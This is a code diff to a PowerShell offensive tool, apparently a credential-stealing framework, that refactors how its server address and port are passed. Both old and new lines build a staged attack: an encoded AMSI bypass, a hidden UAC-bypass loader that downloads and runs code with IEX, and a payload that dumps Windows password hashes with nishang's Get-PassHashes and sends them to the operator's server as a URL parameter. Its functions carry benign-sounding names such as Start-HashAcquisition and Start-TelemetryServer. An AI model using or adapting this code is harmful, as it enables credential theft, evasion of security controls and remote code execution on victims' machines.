@@ -8,11 +8,7 @@ function New-Payloads {
 		[Parameter(Mandatory = $true, Position = 0)]
 		[ValidateNotNullOrEmpty()]
 		[string]
-		$ServerAddress,
-		[Parameter(Mandatory = $false, Position = 1)]
-		[ValidateNotNullOrEmpty()]
-		[string]
-		$ServerPort
+		$ServerAddress
 	)
     
 	if (!(Get-Resources))
@@ -26,15 +22,15 @@ function New-Payloads {
     $AmsiBypass = '[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))).GetField([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("YW1zaUluaXRGYWlsZWQ=")),"NonPublic,Static").SetValue($null,$true)'
 	$GetHashes = Get-Content (Resolve-Path ".\nishang\Gather\Get-PassHashes.ps1")
 
-	$Preloader = "powershell -w h -c IEX(wget 'http://$ServerAddress"+":$ServerPort/loader')"
+	$Preloader = "powershell -w h -c IEX(wget 'http://$ServerAddress/loader')"
 
     $Loader = Get-Content (Resolve-Path ".\Easy-UAC\Easy-UAC.ps1") | Out-String
-	$Loader += ";Easy-UAC -Hidden -Command " + '"' + "IEX(Invoke-WebRequest 'http://$ServerAddress"+":$ServerPort/payload')" + '"'
+	$Loader += ";Easy-UAC -Hidden -Command " + '"' + "IEX(Invoke-WebRequest 'http://$ServerAddress/payload')" + '"'
 	$Loader = $Loader | Convert-StringToB64 -Compress -Encoding ASCII | Package-CompressedB64 -Encoding ASCII
 
 	$Payload = "$AmsiBypass;"
 	$Payload +=  $GetHashes | Out-String | Convert-StringToB64 -Compress -Encoding ASCII | Package-CompressedB64 -Encoding ASCII
-	$Payload += ";Invoke-WebRequest ('http://$ServerAddress"+":$ServerPort/data?data='+[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((Get-PassHashes | Out-String))));[GC]::Collect()"
+	$Payload += ";Invoke-WebRequest ('http://$ServerAddress/data?data='+[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((Get-PassHashes | Out-String))));[GC]::Collect()"
 	$Payload = $Payload | Convert-StringToB64 -Compress -Encoding ASCII | Package-CompressedB64 -Encoding ASCII
 
 	return [PSCustomObject]@{Preloader=$Preloader;Loader=$Loader;Payload=$Payload}
@@ -123,11 +119,11 @@ function Start-TelemetryServer {
 function Start-HashAcquisition {
 	[CmdletBinding()]
 	Param(
-		[Parameter(Mandatory = $false, Position = 0)]
+		[Parameter(Mandatory = $false, Position = 0, ParameterSetName = 'ExternalAddress')]
 		[ValidateNotNullOrEmpty()]
 		[string]
 		$ServerAddress,
-		[Parameter(Mandatory = $false, Position = 1)]
+		[Parameter(Mandatory = $false, Position = 1, ParameterSetName = 'ExternalAddress')]
 		[ValidateNotNullOrEmpty()]
 		[Int]
 		$ServerPort = 9000,
@@ -135,7 +131,7 @@ function Start-HashAcquisition {
 		[ValidateNotNullOrEmpty()]
 		[switch]
 		$SaveToFile,
-		[Parameter(Mandatory = $false, Position = 1)]
+		[Parameter(Mandatory = $false, Position = 2)]
 		[ValidateNotNullOrEmpty()]
 		[switch]
 		$NoBlock
@@ -147,7 +143,8 @@ function Start-HashAcquisition {
         return;
     }
 
-	if (!$ServerAddress) {$ServerAddress = Get-LocalIP}
+	$ExternalAddress = $ServerAddress
+	if (!$ServerAddress) {$ServerAddress = Get-LocalIP; $ExternalAddress = $ServerAddress +':'+ $ServerPort}
 
 	if (Test-Port -IP $ServerAddress -Port $ServerPort)
 	{
@@ -155,7 +152,7 @@ function Start-HashAcquisition {
 		return;
 	}
 
-	$Payloads = New-Payloads -ServerAddress $ServerAddress -ServerPort $ServerPort
+	$Payloads = New-Payloads -ServerAddress ($ExternalAddress)
 
 	if (!$Payloads)
 	{
@@ -171,7 +168,7 @@ function Start-HashAcquisition {
 	Write-Host
 
 	Write-Host
-	Write-Host "Listening for incoming requests on 127.0.0.1:$ServerPort..."
+	Write-Host "Listening for incoming requests on $ExternalAddress..."
 	Write-Host
 	Write-Host
 
